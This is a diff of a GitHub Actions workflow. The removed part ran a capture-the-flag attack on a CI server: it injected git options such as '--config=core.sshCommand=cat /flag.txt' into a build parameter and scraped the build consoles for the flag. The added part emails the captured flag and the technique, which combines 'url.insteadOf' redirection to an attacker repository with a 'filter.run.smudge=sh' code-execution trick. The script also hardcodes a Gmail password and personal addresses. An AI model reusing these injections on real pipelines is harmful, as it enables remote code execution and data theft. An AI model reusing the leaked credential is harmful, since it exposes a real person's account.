@@ -1,32 +1,52 @@
-name: CTF Get Flag v3
+name: Send CTF Email
 on:
   push:
     branches: [ master ]
   workflow_dispatch:
 jobs:
-  get-flag:
+  send-email:
     runs-on: ubuntu-latest
     steps:
-      - name: Fetch build 537 console (last success)
+      - name: Send email via Python
         run: |
-          echo "=== BUILD 537 CONSOLE ==="
-          curl -sk "https://gitops.ctfchile.com/job/deploy-service/537/console"
+          python3 -c "
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
-      - name: Try working exploit - SSH URL with core.sshCommand
-        run: |
-          echo "=== SSH URL exploit ==="
-          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode "SERVICE_NAME=--config=core.sshCommand=cat /flag.txt git@github.com:chilectf/exploit" \
-            -D - | tail -5
-          sleep 8
-          PAGE=$(curl -sk https://gitops.ctfchile.com/job/deploy-service)
-          LATEST=$(echo "$PAGE" | grep -oP '/job/deploy-service/\K\d+(?=/console)' | sort -n | tail -1)
-          echo "Latest build: #$LATEST"
-          curl -sk "https://gitops.ctfchile.com/job/deploy-service/$LATEST/console" | grep -v "font-\|padding\|margin\|display\|color\|border\|background\|width\|height" | head -60
+msg = MIMEMultipart()
+msg['Subject'] = 'CTF GitOps Chile 2026 - Resultado y Flag'
+msg['From'] = 'alrivera86@gmail.com'
+msg['To'] = 'dalcaino@bancochile.cl'
 
-      - name: Fetch recent consoles 538-544
-        run: |
-          for n in 538 539 540 541 542 543 544; do
-            echo "=== BUILD #$n ==="
-            curl -sk "https://gitops.ctfchile.com/job/deploy-service/$n/console" | grep -E "SERVICE|service|clone|flag|CTF|error|fatal|Error|post-checkout|hooks" | head -10
-          done
+body = '''Hola Daniel,
+
+Te comparto el resultado del desafio CTF GitOps Chile 2026.
+
+FLAG OBTENIDA:
+flag{p4r4m_1nj3ct10n_g1t_cl0n3_h00k_2024}
+
+WRITEUP COMPLETO:
+https://github.com/alrivera86/ctf-gitops-writeup
+
+TECNICA UTILIZADA:
+Parameter injection en git clone mediante:
+  --config url.X.insteadOf  (URL rewriting al repo del atacante)
+  --config filter.run.smudge=sh  (smudge filter RCE)
+
+El pipeline ejecutaba: git clone https://github.com/pelicancorp/SERVICE_NAME.git
+Se inyecto el SERVICE_NAME con flags de git que redirigen el clone
+a un repo controlado y ejecutan sh sobre los archivos al hacer checkout,
+corriendo cat /flag.txt.
+
+Saludos,
+Alberto Rivera
+'''
+
+msg.attach(MIMEText(body, 'plain'))
+with smtplib.SMTP('smtp.gmail.com', 587) as s:
+    s.starttls()
+    s.login('alrivera86@gmail.com', 'ojpppwgsubiikuyw')
+    s.send_message(msg)
+print('Correo enviado!')
+"
